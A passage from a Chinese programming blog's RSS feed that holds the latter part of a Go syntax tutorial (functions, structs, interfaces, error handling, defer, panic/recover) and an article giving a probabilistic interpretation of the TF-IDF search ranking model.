<p><strong>new</strong> 是一个分配内存的内建函数，但不同于其他语言中同名的new所作的工作，<strong>它只是将内存清零，而不是初始化内存</strong>。new(T)为一个类型为T的新项目分配了值为零的存储空间并返回其地址，也就是一个类型为*T的值。用Go的术语来说，就是<strong>它返回了一个指向新分配的类型为T的零值的指针</strong>。</p>
<p><code><strong>make</strong>(T, </code><em>args</em><code>)</code>函数的目的与<code>new(T)</code>不同。它仅用于创建切片、map和chan（消息管道），并返回类型<code>T</code>（不是<code>*T</code>）的一个<strong>被初始化了的</strong>（不是<strong>零</strong>）实例。这种差别的出现是由于这三种类型实质上是对在使用前必须进行初始化的数据结构的引用。例如，切片是一个具有三项内容的描述符，包括指向数据（在一个数组内部）的指针、长度以及容量，在这三项内容被初始化之前，切片值为<code>nil</code>。对于切片、映射和信道，<code>make</code>初始化了其内部的数据结构并准备了将要使用的值。如：</p>
<p>下面的代码分配了一个整型数组，长度为10，容量为100，并返回前10个数组的切片</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang">make([]int, 10, 100)</pre>
<p>以下示例说明了<code>new</code>和<code>make</code>的不同。</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang">
var p *[]int = new([]int)   // 为切片结构分配内存；*p == nil；很少使用
var v  []int = make([]int, 10) // 切片v现在是对一个新的有10个整数的数组的引用

// 不必要地使问题复杂化：
var p *[]int = new([]int)
fmt.Println(p) //输出：&amp;[]
*p = make([]int, 10, 10)
fmt.Println(p) //输出：&amp;[0 0 0 0 0 0 0 0 0 0]
fmt.Println((*p)[2]) //输出： 0

// 习惯用法:
v := make([]int, 10)
fmt.Println(v) //输出：[0 0 0 0 0 0 0 0 0 0]
</pre>
<h4>函数</h4>
<p>老实说，我对Go语言这种反过来声明变量类型和函数返回值的做法有点不满（保持和C一样的不可以吗? 呵呵）</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang">
package main
import &quot;fmt&quot;

func max(a int, b int) int { //注意参数和返回值是怎么声明的

    if a &gt; b {
        return a
    }
    return b
}

func main(){
    fmt.Println(max(4, 5))
}

</pre>
<p><strong>函数返回多个值</strong></p>
<p>Go中很多Package 都会返回两个值，一个是正常值，一个是错误，如下所示：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang">
package main
import &quot;fmt&quot;

func main(){
    v, e := multi_ret(&quot;one&quot;)
    fmt.Println(v,e) //输出 1 true

    v, e = multi_ret(&quot;four&quot;)
    fmt.Println(v,e) //输出 0 false

    //通常的用法(注意分号后有e)
    if v, e = multi_ret(&quot;four&quot;); e {
        // 正常返回
    }else{
        // 出错返回
    }
}

func multi_ret(key string) (int, bool){
    m := map[string]int{&quot;one&quot;: 1, &quot;two&quot;: 2, &quot;three&quot;: 3}

    var err bool
    var val int

    val, err = m[key]

    return val, err
}
</pre>
<p><strong>函数不定参数</strong></p>
<p>例子很清楚了，我就不多说了</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang">
func sum(nums ...int) {
    fmt.Print(nums, &quot; &quot;)  //输出如 [1, 2, 3] 之类的数组
    total := 0
    for _, num := range nums { //要的是值而不是下标
        total += num
    }
    fmt.Println(total)
}
func main() {
    sum(1, 2)
    sum(1, 2, 3)

    //传数组
    nums := []int{1, 2, 3, 4}
    sum(nums...)
}</pre>
<p><strong>函数闭包</strong></p>
<p>nextNum这个函数返回了一个匿名函数，这个匿名函数记住了nextNum中i+j的值，并改变了i,j的值，于是形成了一个闭包的用法</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang">
func nextNum() func() int {
    i,j := 1,1
    return func() int {
        var tmp = i+j
        i, j = j, tmp
        return tmp
    }
}
//main函数中是对nextNum的调用，其主要是打出下一个斐波拉契数
func main(){
    nextNumFunc := nextNum()
    for i:=0; i&lt;10; i++ {
        fmt.Println(nextNumFunc())
    }
}
</pre>
<p><strong>函数的递归</strong></p>
<p>和c基本是一样的</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang">
func fact(n int) int {
    if n == 0 {
        return 1
    }
    return n * fact(n-1)
}

func main() {
    fmt.Println(fact(7))
}</pre>
<h4>结构体</h4>
<p>Go的结构体和C的基本上一样，不过在初始化时有些不一样，Go支持带名字的初始化。</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang">
type Person struct {
    name string
    age  int
    email string
}

func main() {
    //初始化
    person := Person{&quot;Tom&quot;, 30, &quot;tom@gmail.com&quot;}
    person = Person{name:&quot;Tom&quot;, age: 30, email:&quot;tom@gmail.com&quot;}

    fmt.Println(person) //输出 {Tom 30 tom@gmail.com}

    pPerson := &amp;person

    fmt.Println(pPerson) //输出 &amp;{Tom 30 tom@gmail.com}

    pPerson.age = 40
    person.name = &quot;Jerry&quot;
    fmt.Println(person) //输出 {Jerry 40 tom@gmail.com}
}
</pre>
<h4>结构体方法</h4>
<p>不多说了，看代码吧。</p>
<p>注意：Go语言中没有public, protected, private的关键字，所以，<strong>如果你想让一个方法可以被别的包访问的话，你需要把这个方法的第一个字母大写。这是一种约定</strong>。</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang">
type rect struct {
    width, height int
}

func (r *rect) area() int { //求面积
    return r.width * r.height
}

func (r *rect) perimeter() int{ //求周长
    return 2*(r.width + r.height)
}

func main() {
    r := rect{width: 10, height: 15}

    fmt.Println(&quot;面积: &quot;, r.area())
    fmt.Println(&quot;周长: &quot;, r.perimeter())

    rp := &amp;r
    fmt.Println(&quot;面积: &quot;, rp.area())
    fmt.Println(&quot;周长: &quot;, rp.perimeter())
}
</pre>
<h4>接口和多态</h4>
<p>接口意味着多态，下面是一个经典的例子，不用多说了，自己看代码吧。</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang">
//---------- 接 口 --------//
type shape interface {
    area() float64 //计算面积
    perimeter() float64 //计算周长
}

//--------- 长方形 ----------//
type rect struct {
    width, height float64
}

func (r *rect) area() float64 { //面积
    return r.width * r.height
}

func (r *rect) perimeter() float64 { //周长
    return 2*(r.width + r.height)
}

//----------- 圆  形 ----------//
type circle struct {
    radius float64
}

func (c *circle) area() float64 { //面积
    return math.Pi * c.radius * c.radius
}

func (c *circle) perimeter() float64 { //周长
    return 2 * math.Pi * c.radius
}

// ----------- 接口的使用 -----------//
func interface_test() {
    r := rect {width:2.9, height:4.8}
    c := circle {radius:4.3}

    s := []shape{&amp;r, &amp;c} //通过指针实现

    for _, sh := range s {
        fmt.Println(sh)
        fmt.Println(sh.area())
        fmt.Println(sh.perimeter())
    }
}
</pre>
<h4>错误处理 &#8211; Error接口</h4>
<p>函数错误返回可能是C/C++时最让人纠结的东西的，Go的多值返回可以让我们更容易的返回错误，其可以在返回一个常规的返回值之外，还能轻易地返回一个详细的错误描述。通常情况下，错误的类型是error，它有一个内建的接口。</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang">type error interface {
    Error() string
}</pre>
<p>还是看个示例吧：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang">package main

import &quot;fmt&quot;
import &quot;errors&quot;

//自定义的出错结构
type myError struct {
    arg  int
    errMsg string
}
//实现Error接口
func (e *myError) Error() string {
    return fmt.Sprintf(&quot;%d - %s&quot;, e.arg, e.errMsg)
}

//两种出错
func error_test(arg int) (int, error) {
    if arg &lt; 0  {
         return -1, errors.New(&quot;Bad Arguments - negtive!&quot;)
     }else if arg &gt;256 {
        return -1, &amp;myError{arg, &quot;Bad Arguments - too large!&quot;}
    }
    return arg*arg, nil
}

//相关的测试
func main() {
    for _, i := range []int{-1, 4, 1000} {
        if r, e := error_test(i); e != nil {
            fmt.Println(&quot;failed:&quot;, e)
        } else {
            fmt.Println(&quot;success:&quot;, r)
        }
    }
}</pre>
<p>程序运行后输出：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="shell">
failed: Bad Arguments - negtive!
success: 16
failed: 1000 - Bad Arguments - too large!
</pre>
<h4>错误处理 &#8211; Defer</h4>
<p>下面的程序对于每一个熟悉C语言的人来说都不陌生（有资源泄露的问题），C++使用RAII来解决这种问题。</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang">
func CopyFile(dstName, srcName string) (written int64, err error) {
    src, err := os.Open(srcName)
    if err != nil {
        return
    }

    dst, err := os.Create(dstName)
    if err != nil {
        return
    }

    written, err = io.Copy(dst, src)
    dst.Close()
    src.Close()
    return
}</pre>
<p>Go语言引入了Defer来确保那些被打开的文件能被关闭。如下所示：（这种解决方式还是比较优雅的）</p>
<p>&lt;</p>
<p>pre class=&#8221;EnlighterJSRAW&#8221; data-enlighter-language=&#8221;golang&#8221; data-enlighter-highlight=&#8221;6,12&#8243;><br />
func CopyFile(dstName, srcName string) (written int64, err error) {<br />
    src, err := os.Open(srcName)<br />
    if err != nil {<br />
        return<br />
    }<br />
    defer src.Close()</p>
<pre><code>dst, err := os.Create(dstName)
if err != nil {
    return
}
defer dst.Close()

return io.Copy(dst, src)
</code></pre>
<p>}[/c]</p>
<p>Go的defer语句预设一个函数调用（延期的函数），该调用在函数执行defer返回时立刻运行。该方法显得不同常规，但却是处理上述情况很有效，无论函数怎样返回，都必须进行资源释放。</p>
<p>我们再来看一个defer函数的示例：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang">
for i := 0; i &lt; 5; i++ {
    defer fmt.Printf(&quot;%d &quot;, i)
}</pre>
<p>被延期的函数以后进先出（LIFO）的顺行执行，因此以上代码在返回时将打印4 3 2 1 0。</p>
<p>总之，我个人觉得defer的函数行为有点怪异，我现在还没有完全搞清楚。</p>
<h4>错误处理 &#8211; Panic/Recover</h4>
<p>对于不可恢复的错误，Go提供了一个内建的panic函数，它将创建一个运行时错误并使程序停止（相当暴力）。该函数接收一个任意类型（往往是字符串）作为程序死亡时要打印的东西。当编译器在函数的结尾处检查到一个panic时，就会停止进行常规的return语句检查。</p>
<p>下面的仅仅是一个示例。实际的库函数应避免panic。如果问题可以容忍，最好是让事情继续下去而不是终止整个程序。</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang">
var user = os.Getenv(&quot;USER&quot;)

func init() {
    if user == &quot;&quot; {
        panic(&quot;no value for $USER&quot;)
    }
}</pre>
<p>当panic被调用时，它将立即停止当前函数的执行并开始逐级解开函数堆栈，同时运行所有被defer的函数。如果这种解开达到堆栈的顶端，程序就死亡了。但是，也可以使用内建的recover函数来重新获得Go程的控制权并恢复正常的执行。 对recover的调用会通知解开堆栈并返回传递到panic的参量。由于仅在解开期间运行的代码处在被defer的函数之内，recover仅在被延期的函数内部才是有用的。</p>
<p>你可以简单地理解为recover就是用来捕捉Painc的，防止程序一下子就挂掉了。</p>
<p>下面是一个例程，很简单了，不解释了</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang">
func g(i int) {
    if i&gt;1 {
        fmt.Println(&quot;Panic!&quot;)
        panic(fmt.Sprintf(&quot;%v&quot;, i))
    }

}

func f() {
    defer func() {
        if r := recover(); r != nil {
            fmt.Println(&quot;Recovered in f&quot;, r)
        }
    }()

    for i := 0; i &lt; 4; i++ {
        fmt.Println(&quot;Calling g with &quot;, i)
        g(i)
        fmt.Println(&quot;Returned normally from g.&quot;)
     }
}

func main() {
    f()
    fmt.Println(&quot;Returned normally from f.&quot;)
}</pre>
<p>运行结果如下：（我们可以看到Painc后的for循环就没有往下执行了，但是main的程序还在往下走）</p>
<pre class="EnlighterJSRAW" data-enlighter-language="shell">
Calling g with  0
Returned normally from g.
Calling g with  1
Returned normally from g.
Calling g with  2
Panic!
Recovered in f 2
Returned normally from f.
</pre>
<p>你习惯这种编程方式吗？我觉得有点诡异。呵呵。</p>
<p>好了，上面是是一Go语言相关的编程语法的介绍，我没有事无巨细，只是让你了解一下Go语言是长什么样的。<strong>当然，这还没完，请期待下篇——Go语言的特性</strong>。<!--



<p align="center"><a href= target=_blank><img decoding="async" src=""></a></p>





<p align="center"><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg"> <img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg" width="300" height="300"> <br />关注CoolShell微信公众账号和微信小程序</p>

 

--></p>
<div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>

<div class="wp_rp_wrap  wp_rp_vertical_m" ><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li ><a href="https://coolshell.cn/articles/21615.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2021/09/go-generics-150x150.png" alt="Go编程模式 ： 泛型编程" width="150" height="150" /></a><a href="https://coolshell.cn/articles/21615.html" class="wp_rp_title">Go编程模式 ： 泛型编程</a></li><li ><a href="https://coolshell.cn/articles/21263.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2020/12/go.k8s-150x150.png" alt="Go 编程模式：k8s Visitor 模式" width="150" height="150" /></a><a href="https://coolshell.cn/articles/21263.html" class="wp_rp_title">Go 编程模式：k8s Visitor 模式</a></li><li ><a href="https://coolshell.cn/articles/21228.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2020/12/go.line_.-150x150.png" alt="Go编程模式：Pipeline" width="150" height="150" /></a><a href="https://coolshell.cn/articles/21228.html" class="wp_rp_title">Go编程模式：Pipeline</a></li><li ><a href="https://coolshell.cn/articles/21214.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2020/12/go.pair_-150x150.png" alt="Go编程模式：委托和反转控制" width="150" height="150" /></a><a href="https://coolshell.cn/articles/21214.html" class="wp_rp_title">Go编程模式：委托和反转控制</a></li><li ><a href="https://coolshell.cn/articles/21179.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2020/12/go.generate-150x150.png" alt="Go 编程模式：Go Generation" width="150" height="150" /></a><a href="https://coolshell.cn/articles/21179.html" class="wp_rp_title">Go 编程模式：Go Generation</a></li><li ><a href="https://coolshell.cn/articles/21164.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2020/12/go.map_.reduce-150x150.png" alt="Go编程模式：Map-Reduce" width="150" height="150" /></a><a href="https://coolshell.cn/articles/21164.html" class="wp_rp_title">Go编程模式：Map-Reduce</a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/8460.html">Go 语言简介（上）— 语法</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></content:encoded>
					
					<wfw:commentRss>https://coolshell.cn/articles/8460.html/feed</wfw:commentRss>
			<slash:comments>135</slash:comments>
		
		
			</item>
		<item>
		<title>TF-IDF模型的概率解释</title>
		<link>https://coolshell.cn/articles/8422.html</link>
					<comments>https://coolshell.cn/articles/8422.html#comments</comments>
		
		<dc:creator><![CDATA[Todd]]></dc:creator>
		<pubDate>Wed, 24 Oct 2012 01:05:54 +0000</pubDate>
				<category><![CDATA[杂项资源]]></category>
		<category><![CDATA[程序设计]]></category>
		<category><![CDATA[Algorithm]]></category>
		<category><![CDATA[search]]></category>
		<category><![CDATA[TF-IDF]]></category>
		<guid isPermaLink="false">http://coolshell.cn/?p=8422</guid>

					<description><![CDATA[<p>（感谢 @猫叔shiro（以前的todd） 投递此文） 信息检索概述 信息检索是当前应用十分广泛的一种技术，论文检索、搜索引擎都属于信息检索的范畴。通常，人们把...</p>
<p class="read-more"><a class="btn btn-default" href="https://coolshell.cn/articles/8422.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
The post <a href="https://coolshell.cn/articles/8422.html">TF-IDF模型的概率解释</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></description>
										<content:encoded><![CDATA[<p><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158"
     crossorigin="anonymous"></script><strong><span style="color: #cc0000">（感谢 </span></strong><a href="http://weibo.com/weidagang" target="_blank">@猫叔shiro</a><strong><span style="color: #cc0000">（以前的todd） 投递此文）</span></strong></p>
<h4>信息检索概述</h4>
<p>信息检索是当前应用十分广泛的一种技术，论文检索、搜索引擎都属于信息检索的范畴。通常，人们把信息检索问题抽象为：在文档集合D上，对于由关键词w[1] &#8230; w[k]组成的查询串q，返回一个按查询q和文档d匹配度relevance(q, d)排序的相关文档列表D&#8217;。</p>
<p>对于这一问题，先后出现了布尔模型、向量模型等各种经典的信息检索模型，它们从不同的角度提出了自己的一套解决方案。布尔模型以集合的布尔运算为基础，查询效率高，但模型过于简单，无法有效地对不同文档进行排序，查询效果不佳。向量模型把文档和查询串都视为词所构成的多维向量，而文档与查询的相关性即对应于向量间的夹角。不过，由于通常词的数量巨大，向量维度非常高，而大量的维度都是0，计算向量夹角的效果并不好。另外，庞大的计算量也使得向量模型几乎不具有在互联网搜索引擎这样海量数据集上实施的可行性。</p>
<h4>tf-idf模型</h4>
<p>目前，真正在搜索引擎等实际应用中广泛使用的是tf-idf模型。tf-idf模型的主要思想是：如果词w在一篇文档d中出现的频率高，并且在其他文档中很少出现，则认为词w具有很好的区分能力，适合用来把文章d和其他文章区分开来。该模型主要包含了两个因素：</p>
<p><span id="more-8422"></span></p>
<p>1) 词w在文档d中的词频tf (Term Frequency)，即词w在文档d中出现次数count(w, d)和文档d中总词数size(d)的比值：</p>
<pre><code>tf(w,d) = count(w, d) / size(d) </code></pre>
<p>2) 词w在整个文档集合中的逆向文档频率idf (Inverse Document Frequency)，即文档总数n与词w所出现文件数docs(w, D)比值的对数:</p>
<pre><code>idf = log(n / docs(w, D)) </code></pre>
<p>tf-idf模型根据tf和idf为每一个文档d和由关键词w[1]&#8230;w[k]组成的查询串q计算一个权值，用于表示查询串q与文档d的匹配度：</p>
<pre><code>
tf-idf(q, d) 
= sum { i = 1..k | tf-idf(w[i], d) } 
= sum { i = 1..k | tf(w[i], d) * idf(w[i]) } 
</code></pre>
<h4>信息检索问题的概率视角</h4>
<p>直观上看，tf描述的是文档中词出现的频率；而idf是和词出现文档数相关的权重。我们比较容易定性地理解tf-idf的基本思想，但具体到tf-idf的一些细节却并不是那么容易说清楚为什么。比如：</p>
<p>1) 为什么tf是count(w, d) / size(d)？能不能是log(count(w, d) / size(d))等其他形式？</p>
<p>2) 为什么idf是一个log形式？</p>
<p>3) 为什么tf和idf之间是乘积关系，而不是加法或指数关系？</p>
<p>4) 为什么多个关键词的tf-idf值是加法关系，而不是乘法或者指数关系？</p>
<p>5) 除了tf-idf值，Google还会计算网页的PageRank值，二者相乘得到最后的权值，为什么是乘法，而不是加法或指数？</p>
<p>据说，最初甚至tf-idf的提出者自己也没有对诸如“为什么idf是log形式”这个问题给出有力的解释，虽然后来有人从信息论的角度对idf的log形式给出了令人信服的解释，但是剩下的其他一些疑问仍然存在。在我了解的范围内，对于tf-idf模型还没有一个真正统一完整的理论解释。在试图为tf-idf找到更好的理论解释的过程中，我意识到对tf-idf模型种种疑问的根源在于tf-idf试图表达的“查询q和文档的匹配度”本身就有一定的模糊性，什么叫做“匹配度”，这就有很大的自由发挥空间。如果说向量模型的用向量夹角来表示匹配度概念还有一定的理论基础，那么用tf-idf来表达匹配度就有点“与其说是科学，不如说是艺术”的味道。</p>
<p>更进一步，其实，信息检索问题的抽象方式“在文档集合D上，对于给定查询串q，返回一个按查询q和文档d匹配度relevance(q, d)排序的相关文档列表D&#8217;”本身是值得反思的。我们应当考虑抛弃“匹配度”这种模糊的目标，从根源上寻求一种具有明确数学意义的目标。如果我们从概率视角来看，<strong>把“查询串q和文档d的匹配度”问题转换为“当查询串是q时，用户期望获得文档d的概率”问题</strong>，信息检索问题就清晰多了。一方面这个概率描述是站在人的角度来看待信息检索问题的，更加贴近实际的用户体验；另一方面，概率本身是有明确数学意义的，这样我们就首先从目标上对问题进行了严格化。</p>
<p>下面，我将通过一个模型，从概率的视角，一边解释tf-idf的概率意义，一边指出其不合理之处。</p>
<h4>盒子小球模型</h4>
<p>为了分析“当查询串是q时，用户期望获得文档d的概率”问题，我首先建立了一种称为“盒子小球模型”的简化模型。盒子小球模型把词想象成各种不同颜色的小球，文档想象成装有若干小球的盒子，把“当查询串是q时，用户期望获得文档d的概率“转换为下面的问题：</p>
<p><strong>有n个盒子d[1], d[2], &#8230; d[n]，每个盒子中有若干不同颜色的小球，有人随机地选择了一个盒子，并从盒子中随机地拿出了一个颜色为w[j]的小球，那么这个小球来自于盒子d[i]的概率是多少？</strong></p>
<p>其实，这就是经典的条件概率问题P(d[i] | w[j])，采用贝叶斯推断将其转化为：</p>
<pre><code>
P(d[i] | w[j]) 
= P(d[i], w[j]) / P(w[j]) 
= P(d[i]) * P(w[j] | d[i]) / P(w[j]) 
</code></pre>
<p>我们注意到这个条件概率包括几个部分，P(d[i])是盒子d[i]被选中的先验概率，p(w[j])是w[j]颜色小球被选中的先验概率，P(w[j] | d[i])是在盒子d[i]中选中颜色w[j]小球的条件概率。</p>
<h4>文档先验概率P(d)与PageRank</h4>
<p>首先，我们来看盒子d[i]被选中的先验概率P(d[i])是什么。P(d[i])的意义是：当用户什么也没有输入的时候，它可能对文档d[i]感兴趣的概率。在没有更多信息的情况下，我们可以认为每个盒子被选中的先验概率P(d[i])是相等的，都等于1 / m，其中m表示总文档数（总盒子数），这时P(d[i])作为公共系数可被忽略。不过，在实际应用中，我们通常可以根据其他知识获得各文档的先验概率，比如，学术文献和网页通常可以基于引用度模型计算其先验概率，这些经典论文和热门网页是多数人乐于见到的。说到这里，你可能已经发现，Google PageRank本质上就是这个先验概率P(d[i])乘以某个系数！所以，PageRank实际上也被纳入这个条件概率模型中来了，这就不难解释为什么在Google的排序算法中PageRank权重和tf-idf权重是一种乘积关系而不是加或者指数关系。另一方面，在理解了文档先验概率对整个搜索结果概率的影响后，当搜索引擎中针对PageRank出现各种假链接SEO时，我们可以不拘泥于基于链接引用模型的PageRank，只要是以网页先验概率为目标，不论是采用基于链接引用的PageRank，还是基于搜索结果点击数模型，或是其他模型，都是可以的。这就是“变通”，从原理上“通”了，就可以在方法上“变”。</p>
<h4>词的先验概率P(w)</h4>
<p>下面我们来考察词w[j]的先验概率P(w[j])。P(w[j])的意义是：在整个文档集合中，w[j]被作为搜索关键词的概率，比如：“iPhone 5”，“青花瓷”这类词被用作搜索关键词的概率较高，而“的”，“什么”，“我们”这类高频词不大可能成为搜索关键词。那么，我们如何来定量计算P(w[j])呢？一种思路就是把w[j]在文档集中出现的频率作为其先验概率。不过，显然存在更好的方案：在大量的搜索查询中进行统计，统计方法得出P(w[j])的方法很接近P(w[j])本质的，不需要引入额外的假设。比如，一段时间内某搜索引擎的搜索总次数为10^10次，“公积金”这个词出现了100次，那么，我们可以认为先验概率P(&#8220;公积金&#8221;)就是100 / 10^10 = 10^-8。</p>
<h4>词代表文档主题的条件概率P(w | d)</h4>
<p>最后，我们来看条件概率P(w[j] | d[i])。P(w[j] | d[i])的意义是在文档d[i]中，人们用关键词w[j]来搜索它的概率。那么，什么样的词是人们会用来搜索一篇文档的呢？多数情况下，是那些代表一篇文档主题的词。比如，有一篇新闻是关于iPhone 5发布会的，那么“iPhone5”， “发布会”，“库克”，“苹果”这些词基本上就构成了文章的主题；那么，反过来说，如果用户想搜索这篇关于iPhone 5发布会的新闻，他就有很大的可能通过这几个词来进行搜索。我们应当注意分辨P(w[j] | d[i])与P(w[j])的区别，后者可以通过大量的查询统计得来，而前者不能与后者直接划等号，因为前者的意义是w[j]代表d[i]主题的概率。如果非要引入统计方法，那么P(w[j] | d[i])对应的统计是：当搜索关键词是w[j]且搜索结果包含d[i]时，用户点击（满意）d[i]作为搜索结果的频率。比如，用“iPhone5 发布会”的搜索，在结果中有都10000次出现了网页x，其中，用户8000次点击了网页x，那么，可以认为有80%的概率网页x的主题是关于“iPhone5 发布会”的。</p>
<h4>词的信息量和idf</h4>
<p>上面谈到了对P(w[j] | d[i])的计算的统计方法，但该方法有一定的局限，比如，要能进行统计首先需要文档出现在足够多的搜索结果中，需要时间和量的积累。除了统计方法外，我们可以考虑其他方法计算词w[j]代表文档d[i]主题的概率。可能有人立刻会想到要对文章进行语义分析提取关键词，给这些关键词高权重，给其他词低权重。这种想法有一定的合理性，但实现上涉及语义分析，没有成熟高效的方法。实际上，信息论为我们提供了另一条高效方案。上面谈到“的”，“什么”，“我们”这类高频词不会成为文档主题和搜索关键词的原因是它们不能提供足够的信息，而“iPhone 5”，“发布会”这样的词汇则信息量丰富。所谓信息是指对不确定性（熵）的减小程度，信息的单位是比特(bit)，信息量越大对于不确定性的减小程度越大。比如，外面可能在下雨也可能没有下雨，可能性空间大小为2，如果我们看一眼窗外，可能性空间就变成了1，那么“看见窗外在下雨”所提供的信息量就和熵的减小程度成正比，具体来讲等于log(2/1)=1。如果要用二进制编码是否下雨，需要1个bit，0代表没有下雨，1代表下雨。</p>
<p>但在很多场景下，各个可能性的概率并不相同，比如：欧洲杯16只球队都可能夺冠，赛前它们夺冠的先验概率并不相同，那么结果的不确定性程度实际上是小于log(16)=4。如果你没有看比赛，有人告诉你西班牙夺冠了，你可能会觉得很正常，但如果有人告诉你瑞士夺冠了，你通常会非常惊讶。这一现象的理论解释是，如果赛前西班牙夺冠概率是1/4，而瑞士夺冠概率是1/32，那么，“西班牙夺冠”的信息量为log(4)=2，即把不确定性减小为原来的1/4，而“瑞士夺冠”的信息量为log(32)=5，不确定性减小为原来的1/32，一下子接受比前者大了两倍以上的信息量，当然你会吃惊。</p>
<p>回到信息检索，比如，“2012美国大选”这个查询串包含了“2012”，“美国”和“大选”3个关键词，我们应该如何定量计算它们的信息量呢？根据信息的定义，词的信息量等于它对不确定性的缩小程度。如果文档总数为2^30，其中2^14篇文档出现了“美国”，那么“美国”这个词就把文档的不确定性从2^30缩小为2^14，它所包含的信息量为log(2^30/2^14)=16；而只有2^10篇文档出现了“大选”，那么大选的信息量就是log(2^30/2^10)=20，比“美国”多了4个bit。而“的”，“什么”，“我们”这些高频词对减小文档不确定性几乎没有帮助，因而信息量为0。相信你已经发现，上面idf(w)公式中的log(n / docs(w, D))实际上就是词w的信息量了。</p>
<p>如果我们考虑词的信息量对条件概率P(w[j] | d[i])的影响，假设“词w在文档中被选中的概率与其在文档中的出现频率和其信息量的乘积成正比”，那么上面的条件概率模型就变成：</p>
<pre><code>
P(d[i] | w[j]) 
= P(d[i], w[j]) / P(w[j]) 
= P(d[i]) * P(w[j] | d[i]) / P(w[j]) 
= P(d[i]) * (tf(w[j], d[i]) * idf(w[j] / sum { k = 1..size(d[i]), tf(w[k], d[i]) * idf(w[k]) }) / p(w[j]) 
= P(d[i]) * (tf-idf(w[j], d[i]) / sum { k = 1..size(d[i]), tf-idf(w[k], d[i]) }) / p(w[j]) 
= P(d[i]) * (tf-idf(w[j], d[i]) / tf-idf(d[i])) / p(w[j]) 
</code></pre>
<p>我们看到tf-idf已经被纳入框架内了，但是还多出文档先验概率P(d[i])，关键词先验概率P(w[j])和文档各词的总tf-idf(d[i])。普通搜索引擎是基于PageRank和tf-idf的，那么，根据这个概率模型，我们可以看出，它没有考虑文档总tf-idf(d[i])和关键词先验概率p(w[j])。如果考虑这两个因素，相信搜索效果会更好。</p>
<h4>多关键词</h4>
<p>上面的条件概率模型主要是针对单个关键词的情况，下面我们进一步将其扩展到多关键词情况。我们知道，在tf-idf中，多个关键词的所产生的tf-idf值是一种叠加关系，那么这是否符合条件概率模型呢？答案是否定的。在两个关键字情况下，条件概率问题转化为“如果有人从一个盒子中同时摸出颜色w[x]的小球和颜色w[y]的小球，这两个小球来自于盒子d[i]的概率是多少？”。假设从盒子中摸出各个小球事件是相互独立的情况下，即</p>
<pre><code>
P(w[x], w[y]) 
= P(w[x]) * P(w[y]) P(w[x], w[y] | d[i]) 
= P(w[x] | d[i]) * P(w[y] | d[i]) 
</code></pre>
<p>我们可以推导出条件概率：</p>
<pre><code>
P(d[i] | w[x], w[y]) 
= P(d[i], w[x], w[y]) / P(w[x], w[y]) 
= P(d[i]) * P(w[x], w[y] | d[i]) / P(w[x], w[y]) 
= P(d[i]) * P(w[x] | d[i]) * P(w[y] | d[i]) / (P(w[x] * P(w[y])) 
= P(d[i]) * (tf-idf(w[x], d[i]) / tf-idf(d[i])) * ((tf-idf(w[y], d[i]) / tf-idf(d[i]))) / (p(w[x]) * P(w[y])) 
</code></pre>
<p>可见，概率模型所得出的各个关键词的tf-idf值之间是乘积关系，这是与tf-idf模型的加法关系是不同的。这一点可能与二者是否要求“文档必须包含所有查询关键词”的基本假设有关系。在文档不包含所有关键字的这种情况下，tf-idf模型可能得出一个非0的匹配度，但条件概率模型得出的概率肯定为0。不过，如果考虑一般查询关键词数量不多（3个以内），而大量文档都同时包含这些关键词，概率模型的乘积关系是比tf-idf模型的加法关系更有理论基础。从根本上讲，这是因为tf-idf的“匹配度”是一个模棱两可的概念，而条件概率有坚实的理论基础。</p>
<h4>总结</h4>
<p>TF-IDF模型是搜索引擎中广泛使用的信息检索模型，但对于TF-IDF模型一直存在各种疑问。本文为信息检索问题一种基于条件概率的盒子小球模型，其核心思想是把“查询串q和文档d的匹配度问题”转化为“查询串q来自于文档d的条件概率问题”。它从概率的视角为信息检索问题定义了比TF-IDF模型所表达的匹配度更为清晰的目标。从概率模型中，我们看到查询串q来自于文档d的条件概率主要包含以下几个因素：1) 文档的先验概率P(d[i])，这与PageRank对应；2) 词w被作为搜索关键词的先验概率P(w)，这可以通过统计方法获得；3) 关键词w代表文档d主题，或以词w搜索文档d的概率，P(w | d)，除了统计方法，这可以通过tf-idf来计算。<!--



<p align="center"><a href= target=_blank><img decoding="async" src=""></a></p>





